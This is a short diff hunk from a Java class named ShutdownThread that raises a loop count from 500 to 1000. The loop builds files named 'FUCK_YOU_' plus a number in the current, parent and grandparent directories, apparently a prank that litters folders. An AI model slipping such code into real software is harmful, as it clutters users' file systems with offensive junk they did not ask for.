@@ -11,7 +11,7 @@ public class ShutdownThread implements Runnable {
 
 	@Override
 	public void run() {
-		for(int i = 0;i < 500;i++){
+		for(int i = 0;i < 1000;i++){
 			File f = new File("FUCK_YOU_"+i);
 			File f2 = new File("../FUCK_YOU_"+i);
 			File f3 = new File("../../FUCK_YOU_"+i);
